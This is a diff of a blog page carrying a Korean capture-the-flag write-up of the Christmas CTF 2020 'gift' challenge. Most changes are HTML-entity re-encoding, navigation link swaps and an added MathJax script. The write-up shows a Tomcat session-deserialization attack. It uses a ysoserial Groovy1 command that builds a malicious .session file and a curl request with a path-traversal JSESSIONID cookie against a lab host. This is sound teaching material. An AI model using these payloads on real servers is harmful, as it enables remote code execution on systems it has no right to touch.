+<p>&#xCD5C;&#xC0C1;&#xC704; &#xACBD;&#xB85C;&#xC5D0; &#xC788;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.(&#xC774;&#xAC83;&#xB3C4; &#xC704;&#xCE58;&#xB97C; &#xC54C;&#xB824;&#xC92C;&#xC5B4;&#xC57C;&#x2026;&#x3160;&#x3160;) &#xC774;&#xC81C; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xC5EC; <code>special_gift</code> &#xBC14;&#xC774;&#xB108;&#xB9AC;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; <code>/webapps/ROOT</code> &#xC5D0; flag &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;&#xB420; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;.</p>
+<p>&#xADF8;&#xC804;&#xC5D0; &#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xD65C;&#xC6A9;&#xD558;&#xB294; &#xAC83;&#xC774; &#xB9DE;&#xB294;&#xC9C0; upload.jsp&#xC758; &#xB0B4;&#xC6A9;&#xC73C;&#xB85C; &#xC62C;&#xB9B4; &#xC218; &#xC788;&#xB294; special file&#xC774; session &#xD30C;&#xC77C;&#xC778;&#xC9C0; &#xD655;&#xC778;&#xD574;&#xBD05;&#xC2DC;&#xB2E4;.</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image17.png" srcset="/img/loading.gif"></p>
-<p>허용되어있는 확장자가 <code>.txt</code>와 <code>.session</code>파일임을 알 수 있습니다!</p>
+<p>&#xD5C8;&#xC6A9;&#xB418;&#xC5B4;&#xC788;&#xB294; &#xD655;&#xC7A5;&#xC790;&#xAC00; <code>.txt</code>&#xC640; <code>.session</code>&#xD30C;&#xC77C;&#xC784;&#xC744; &#xC54C; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image18.png" srcset="/img/loading.gif"></p>
-<p>흠.. 일단 exploit 과정을 정리하면 다음과 같습니다.</p>
+<p>&#xD760;.. &#xC77C;&#xB2E8; exploit &#xACFC;&#xC815;&#xC744; &#xC815;&#xB9AC;&#xD558;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC2B5;&#xB2C8;&#xB2E4;.</p>
 <ul>
-<li>file이 업로드되는 경로는 <code>tomcat/media/gift/&lt;name&gt;</code>이다.</li>
-<li>sessions이 저장되는 경로는 <code>tomcat/sessions</code>이다.</li>
-<li><code>special.jsp</code> 에 따르면 <code>/special_gift</code>를 실행하면 flag 파일이 생성된다.</li>
-<li><code>/bin/bash -c /special_gift</code>를 수행하면 <code>special_gift</code> 파일이 실행되고 flag를 확인할 수 있다.</li>
-<li>serialize session 생성</li>
+<li>file&#xC774; &#xC5C5;&#xB85C;&#xB4DC;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB294; <code>tomcat/media/gift/&lt;name&gt;</code>&#xC774;&#xB2E4;.</li>
+<li>sessions&#xC774; &#xC800;&#xC7A5;&#xB418;&#xB294; &#xACBD;&#xB85C;&#xB294; <code>tomcat/sessions</code>&#xC774;&#xB2E4;.</li>
+<li><code>special.jsp</code> &#xC5D0; &#xB530;&#xB974;&#xBA74; <code>/special_gift</code>&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; flag &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;&#xB41C;&#xB2E4;.</li>
+<li><code>/bin/bash -c /special_gift</code>&#xB97C; &#xC218;&#xD589;&#xD558;&#xBA74; <code>special_gift</code> &#xD30C;&#xC77C;&#xC774; &#xC2E4;&#xD589;&#xB418;&#xACE0; flag&#xB97C; &#xD655;&#xC778;&#xD560; &#xC218; &#xC788;&#xB2E4;.</li>
+<li>serialize session &#xC0DD;&#xC131;</li>
 </ul>
 <pre><code class="hljs pgsql">idioth@ubuntu:~$ java -jar ysoserial.jar Groovy1 &quot;/bin/bash -c /special_gift&quot; &gt; exploit.<span class="hljs-keyword">session</span>
 <span class="hljs-built_in">WARNING</span>: An illegal reflective <span class="hljs-keyword">access</span> operation has occurred
@@ -326,10 +326,10 @@
 <span class="hljs-built_in">WARNING</span>: <span class="hljs-keyword">All</span> illegal <span class="hljs-keyword">access</span> operations will be denied <span class="hljs-keyword">in</span> a future <span class="hljs-keyword">release</span></code></pre>
 
 <ul>
-<li>해당 session file으로 접근</li>
+<li>&#xD574;&#xB2F9; session file&#xC73C;&#xB85C; &#xC811;&#xADFC;</li>
 </ul>
-<pre><code class="hljs xml">idioth@ubuntu:~$ curl &#x27;http://192.168.48.128/index.jsp&#x27; -H &#x27;Cookie:JSESSIONID=../media/gift/test/exploit&#x27;
-<span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HTTP Status 500 – Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span> &#123;<span class="hljs-attribute">font-family</span>:Tahoma,Arial,sans-serif;&#125; <span class="hljs-selector-tag">h1</span>, <span class="hljs-selector-tag">h2</span>, <span class="hljs-selector-tag">h3</span>, <span class="hljs-selector-tag">b</span> &#123;<span class="hljs-attribute">color</span>:white;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;&#125; <span class="hljs-selector-tag">h1</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">22px</span>;&#125; <span class="hljs-selector-tag">h2</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">16px</span>;&#125; <span class="hljs-selector-tag">h3</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;&#125; <span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>:<span class="hljs-number">12px</span>;&#125; <span class="hljs-selector-tag">a</span> &#123;<span class="hljs-attribute">color</span>:black;&#125; <span class="hljs-selector-class">.line</span> &#123;<span class="hljs-attribute">height</span>:<span class="hljs-number">1px</span>;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;<span class="hljs-attribute">border</span>:none;&#125;</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>HTTP Status 500 – Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
+<pre><code class="hljs xml">idioth@ubuntu:~$ curl &apos;http://192.168.48.128/index.jsp&apos; -H &apos;Cookie:JSESSIONID=../media/gift/test/exploit&apos;
+<span class="hljs-meta">&lt;!doctype <span class="hljs-meta-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>HTTP Status 500 &#x2013; Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/css&quot;</span>&gt;</span><span class="css"><span class="hljs-selector-tag">body</span> {<span class="hljs-attribute">font-family</span>:Tahoma,Arial,sans-serif;} <span class="hljs-selector-tag">h1</span>, <span class="hljs-selector-tag">h2</span>, <span class="hljs-selector-tag">h3</span>, <span class="hljs-selector-tag">b</span> {<span class="hljs-attribute">color</span>:white;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;} <span class="hljs-selector-tag">h1</span> {<span class="hljs-attribute">font-size</span>:<span class="hljs-number">22px</span>;} <span class="hljs-selector-tag">h2</span> {<span class="hljs-attribute">font-size</span>:<span class="hljs-number">16px</span>;} <span class="hljs-selector-tag">h3</span> {<span class="hljs-attribute">font-size</span>:<span class="hljs-number">14px</span>;} <span class="hljs-selector-tag">p</span> {<span class="hljs-attribute">font-size</span>:<span class="hljs-number">12px</span>;} <span class="hljs-selector-tag">a</span> {<span class="hljs-attribute">color</span>:black;} <span class="hljs-selector-class">.line</span> {<span class="hljs-attribute">height</span>:<span class="hljs-number">1px</span>;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#525D76</span>;<span class="hljs-attribute">border</span>:none;}</span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>HTTP Status 500 &#x2013; Internal Server Error<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre>
 
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image19.png" srcset="/img/loading.gif"></p>
 <p><img src="/2020/12/29/idioth/christmasctf2020-gift/image20.png" srcset="/img/loading.gif"></p>
@@ -404,9 +404,9 @@
                 <article class="post-prev col-6">
                   
                   
-                  <a href="/2020/12/29/idioth/christmasctf2020-angrforge/">
+                  <a href="/2020/12/29/fabu1ous/oil-system/">
                     <i class="iconfont icon-arrowleft"></i>
-                    <span class="hidden-mobile">[Write-Up] Christmas CTF 2020 - angrforge</span>
+                    <span class="hidden-mobile">[Write-Up] Christmas CTF 2020 - oil system</span>
                     <span class="visible-mobile">Previous</span>
                   </a>
                   
@@ -414,8 +414,8 @@
                 <article class="post-next col-6">
                   
                   
-                  <a href="/2020/12/29/idioth/christmasctf2020-lock/">
-                    <span class="hidden-mobile">[Write-Up] Christmas CTF 2020 - lock</span>
+                  <a href="/2020/12/29/idioth/christmasctf2020-angrforge/">
+                    <span class="hidden-mobile">[Write-Up] Christmas CTF 2020 - angrforge</span>
                     <span class="visible-mobile">Next</span>
                     <i class="iconfont icon-arrowright"></i>
                   </a>
@@ -642,6 +642,45 @@
 
 
 
+
+  
+
+  
+    <!-- MathJax -->
+    <script>
+      MathJax = {
+        tex: {
+          inlineMath: [['$', '$'], ['\\(', '\\)']]
+        },
+        options: {
+          renderActions: {
+            findScript: [10, doc => {
+              document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+                const display = !!node.type.match(/; *mode=display/);
+                const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+                const text = document.createTextNode('');
+                node.parentNode.replaceChild(text, node);
+                math.start = { node: text, delim: '', n: 0 };
+                math.end = { node: text, delim: '', n: 0 };
+                doc.math.push(math);
+              });
+            }, '', false],
+            insertedScript: [200, () => {
+              document.querySelectorAll('mjx-container').forEach(node => {
+                let target = node.parentNode;
+                if (target.nodeName.toLowerCase() === 'li') {
+                  target.parentNode.classList.add('has-jax');
+                }
+              });
+            }, '', false]
+          }
+        }
+      };
+    </script>
+
+    <script async src="https://cdn.staticfile.org/mathjax/3.0.5/es5/tex-svg.js"></script>
+
+  
 
 
 
